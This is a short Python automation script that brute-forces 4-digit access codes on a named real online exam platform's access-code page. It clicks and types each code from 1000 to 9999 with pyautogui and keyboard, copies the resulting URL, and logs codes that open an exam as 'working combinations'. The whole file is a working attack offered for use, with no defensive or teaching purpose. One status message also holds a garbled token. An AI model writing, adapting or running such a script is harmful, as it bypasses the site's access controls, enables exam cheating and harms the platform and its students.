import keyboard
import pyautogui
import time
import webbrowser
import pyperclip
count, counted = 0,0
def exitt():
  print(f"Project Terminated, completed {count} tr868386738676, found {counted} working combinations.")
  exit()
keyboard.add_hotkey("h", exitt)
keyboard.wait("g")
file = open("urls.txt", "a+")
webbrowser.open('https://classes.brilliantpala.org/exams/access-code/')
time.sleep(3)
codes = []
for i in range(1000,10000):
  num = str(i)
  num = "0" * (4-len(str(i)))+ str(i)
  pyautogui.click(1040, 285)
  keyboard.press_and_release("backspace, backspace, backspace, backspace")
  keyboard.write(num)
  pyautogui.click(1040, 340)
  pyautogui.click(1040, 360)
  time.sleep(1)
  pyautogui.click(1040, 70)
  pyautogui.hotkey('ctrl', 'c')
  key = pyperclip.paste()
  data = file.read()
  if key !='https://classes.brilliantpala.org/exams/access-code/' and key not in data:
    key += "\n"
    num += "\n"
    file.write(num)
    file.write(key)
    file.flush()
    counted += 1
    codes += [i]
    pyautogui.hotkey('ctrl', 'w')
    webbrowser.open('https://classes.brilliantpala.org/exams/access-code/')
    time.sleep(3)
  count+=1
else:
   file.close()
   print(f"Project Completed, found {counted} working combinations they are {codes}.")